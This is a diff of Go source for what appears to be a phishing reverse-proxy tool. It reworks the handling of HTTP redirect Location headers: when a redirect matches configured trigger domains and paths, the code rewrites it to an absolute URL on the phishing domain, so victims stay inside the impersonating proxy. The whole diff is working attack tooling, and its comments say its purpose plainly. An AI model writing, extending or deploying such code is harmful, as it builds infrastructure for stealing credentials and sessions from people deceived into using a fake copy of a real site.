@@ -990,34 +990,66 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					locUrl, err := url.Parse(resp.Header.Get("Location"))
 					if err == nil {
 						for _, ru := range pl.rewriteUrls {
+							// Check if trigger domains match
+							domainMatched := false
+							var triggerDomain string
 							for _, d := range ru.triggerDomains {
 								if d == locUrl.Host {
-									for _, pth := range ru.triggerPaths {
-										if pth == locUrl.Path {
-											tid := genTid()
-											origUrl := locUrl.Path
-											if locUrl.RawQuery != "" {
-												origUrl += "?" + locUrl.RawQuery
-											}
-											tidUrlMap.Lock()
-											tidUrlMap.m[tid] = origUrl
-											tidUrlMap.Unlock()
-											q := url.Values{}
-											for _, qv := range ru.rewriteQuery {
-												val := qv.Value
-												if val == "{id}" {
-													val = tid
-												}
-												q.Set(qv.Key, val)
-											}
-											rewriteUrl := ru.rewritePath
-											if len(q) > 0 {
-												rewriteUrl += "?" + q.Encode()
-											}
-											resp.Header.Set("Location", rewriteUrl)
-											break
-										}
+									domainMatched = true
+									triggerDomain = d
+									break
+								}
+							}
+
+							if domainMatched {
+								// Check if trigger paths match
+								pathMatched := false
+								for _, pth := range ru.triggerPaths {
+									if pth == locUrl.Path {
+										pathMatched = true
+										break
 									}
+								}
+
+								if pathMatched {
+									tid := genTid()
+									origUrl := locUrl.Path
+									if locUrl.RawQuery != "" {
+										origUrl += "?" + locUrl.RawQuery
+									}
+
+									// Store original URL mapping
+									tidUrlMap.Lock()
+									tidUrlMap.m[tid] = origUrl
+									tidUrlMap.Unlock()
+
+									// Build query parameters
+									q := url.Values{}
+									for _, qv := range ru.rewriteQuery {
+										val := qv.Value
+										if val == "{id}" {
+											val = tid
+										}
+										q.Set(qv.Key, val)
+									}
+
+									// Convert trigger domain to phishing domain
+									phishHost, found := p.replaceHostWithPhished(triggerDomain)
+									if !found {
+										// Fallback to original behavior if conversion fails
+										phishHost = locUrl.Host
+									}
+
+									// Build the complete rewritten URL using phishing domain
+									rewriteUrl := "https://" + phishHost + ru.rewritePath
+
+									// Add query parameters if any
+									if len(q) > 0 {
+										rewriteUrl += "?" + q.Encode()
+									}
+
+									resp.Header.Set("Location", rewriteUrl)
+									break
 								}
 							}
 						}
